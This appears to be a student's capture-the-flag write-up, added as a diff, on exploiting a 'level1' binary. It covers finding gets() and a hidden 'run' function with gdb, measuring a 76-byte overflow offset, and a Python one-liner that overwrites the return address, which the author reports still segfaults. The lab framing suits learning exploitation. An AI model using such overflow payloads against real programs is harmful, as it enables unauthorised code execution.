@@ -1,0 +1,37 @@
+
+0) Random tests.
+	- No argument
+	- 1 argument
+	- more that 1
+
+All seems be the same, just ask for input from stdin
+
+1) Analyse the binary
+	- While disassembling with gdb we can observe the binary uses gets
+	- If we check in the man 3, gets is dangerous and explotable and should
+		never be used. It vulnerable to buffer overflow.
+	- In the main function we can see nothing to overwrite, i was thinking to
+		try ret2libc to systhem but i reallised that perhaps it could be more
+		functions. With the command nm or strings the function run is easy to find.
+	- Disassembling run we can observe it contains the function system, nice!
+
+2) Conclusion
+	- We have a possible buffer overflow and a target function.
+
+// The address of run is easy to find with gdb
+~$ gdb
+~$ set disassembly-flavour intel
+~$ disassemble main
+~$ disassemble run
+~$ x/wx run
+// How we know the address just need to find the padding bytes
+// Need to overwrite the stack frame + sebp with padding and then seip with the address of run
+// The machine is in little endian
+// With a little bit of backtracking i found that with 76 bytes an SIGILL is raised
+// And with 78 a SIGSEGV so seip is at 76 padding bytes.
+
+// I made my script
+
+~$ python -c 'print "A"*76+""\x44\x84\x04\x08"' | ./level1
+
+// I got some output but also a SIGSEGV (test with via ssh that, could be the limitated condition of the machine ?!?!)
